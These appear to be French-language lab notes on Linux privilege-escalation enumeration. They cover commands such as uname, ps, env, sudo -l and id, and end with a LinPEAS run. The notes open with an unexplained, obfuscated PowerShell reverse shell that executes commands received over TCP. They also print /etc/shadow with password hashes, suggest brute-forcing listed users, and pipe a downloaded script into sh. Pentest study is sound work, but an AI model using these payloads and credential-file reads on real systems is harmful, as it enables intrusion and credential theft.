
```powershell
powershell - $84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream(); [byte[]] $367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0}; while(($d084ee484cf44c09b003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){; $b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09b003024847840f3d); $b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String ); $2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19); $3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0, $12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()}; $84b5d7ab8755451cb386a79589e39fa8.Close()
```

Une étape importante dans l'escalation de privilège est l'énumération des informations d'une machine.


## __Hostname__

La commande **`hostname`** permet de récupérer le **nom de la machine**. Cela peut nous permettre d'avoir des informations sur **son role dans le systeme** (ex: SQL-PROD-01).

```shell
$ hostname
wade7363
```


## __Uname -a__

La commande **`uname -a`** donne les infos sur le **noyau** (kernel) utilisé par le systeme.

```shell
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```


## __/proc/version__

Le fichier **`/proc/version`** nous donne des infos sur le systeme comme **l'OS** ou le type de **compilateur installé**.

```shell
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

```

Le fichier `/etc/issue` peut aussi nous donner des informations similaire mais peut être plus facilement modifier.

```shell
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l
```


## __ps__

La commande **`ps`** est utilisé pour avoir la **liste des processus** en cour d'éxécution sur la machine.

-   **PID** : L'**ID** du processus (unique au processus)
-   **TTY** : **Type de terminal** utilisé par l'utilisateur
-   **TIME** : quantité de **CPU time** utilisée par le processus
-   **CMD** : La **commande** ou l'**exécutable** en cours d'exécution

```shell
$ ps
  PID TTY          TIME CMD
 2064 pts/3    00:00:00 sh
 2177 pts/3    00:00:00 ps
```

| Option        | Description                                  |
| ------------- | -------------------------------------------- |
| **`ps -A`**   | Donne tous les processus en cour d'execution |
| **`ps axjf`** | Affiche une arborescense des processus       |
| **`ps aux`**  | Affiche les processus de tous les utilisateurs                                             |


## __env__

La commande **`env`** affiche toutes les **variables d'environnements** de la machine.

```shell
$ env
MAIL=/var/mail/karen
USER=karen
SSH_CLIENT=10.10.148.226 50742 22
HOME=/home/karen
SSH_TTY=/dev/pts/3
QT_QPA_PLATFORMTHEME=appmenu-qt5
LOGNAME=karen
TERM=xterm
XDG_SESSION_ID=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/
SSH_CONNECTION=10.10.148.226 50742 10.10.179.158 22
```


## __sudo -l__

La commande **`sudo -l`** liste les commandes que l'**utilisateur peut effectuer en sudoer**.


## __ls -la__

La commande **`ls -la`** **lister tous les fichiers** présent dans le répertoire, même les **fichiers caché**, ainsi que leurs **droits**.

```shell
$ ls -la
total 104
drwxr-xr-x  23 root root  4096 Jun 18  2021 .
drwxr-xr-x  23 root root  4096 Jun 18  2021 ..
drwxr-xr-x   2 root root  4096 Jun 18  2021 bin
drwxr-xr-x   3 root root  4096 Jun 18  2021 boot
drwxrwxr-x   2 root root  4096 Jun 18  2021 cdrom
drwxr-xr-x  13 root root  3920 Apr 17 15:05 dev
drwxr-xr-x 129 root root 12288 Apr 17 15:06 etc
drwxr-xr-x   3 root root  4096 Jun 18  2021 home
lrwxrwxrwx   1 root root    33 Jun 18  2021 initrd.img -> boot/initrd.img-3.13.0-24-generic
drwxr-xr-x  23 root root  4096 Jun 18  2021 lib
drwxr-xr-x   2 root root  4096 Apr 16  2014 lib64
drwx------   2 root root 16384 Jun 18  2021 lost+found
drwxr-xr-x   2 root root  4096 Apr 16  2014 media
drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
drwxr-xr-x   2 root root  4096 Apr 16  2014 opt
dr-xr-xr-x 150 root root     0 Apr 17 15:05 proc
drwx------   2 root root  4096 Jun 18  2021 root
drwxr-xr-x  22 root root   780 Apr 17 15:23 run
drwxr-xr-x   2 root root 12288 Jun 18  2021 sbin
drwxr-xr-x   2 root root  4096 Apr 16  2014 srv
dr-xr-xr-x  13 root root     0 Apr 17 15:05 sys
drwxrwxrwt   4 root root  4096 Apr 17 15:23 tmp
drwxr-xr-x  10 root root  4096 Apr 16  2014 usr
drwxr-xr-x  13 root root  4096 Apr 16  2014 var
lrwxrwxrwx   1 root root    30 Jun 18  2021 vmlinuz -> boot/vmlinuz-3.13.0-24-generic
```


## __id__

La commande **`id`** nous donne les **informations sur les droits** de l'utilisateur.

```shell
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```


## __/etc/passwd__

Le fichier **`/etc/passwd`** nous donne la possibilité de voir simplements les **utilisateurs du systemes**.
On peut utiliser la liste d'utilisateur pour un **bruteforce** ou alors les **filtrers** pour ne récupérer que ceux qui sont utile avec **`grep home`**.

```shell
$ cat /etc/passwd | cut -d ":" -f 1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
usbmux
dnsmasq
avahi-autoipd
kernoops
rtkit
saned
whoopsie
speech-dispatcher
avahi
lightdm
colord
hplip
pulse
matt
karen
sshd
```

## __/etc/shadow__

Le fichier **`/etc/shadow`** permet d'avoir accès à la **base de donnée** des **mots de passes hashés** du systeme.

```shell
# cat /etc/shadow
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
```


## __Automatised__

On peut effectuer une enumeration automatisé avec des outils comme [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). 

```shell
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```shell
thomas@raspberrypi:~ $ . curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝

....

                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r'
```

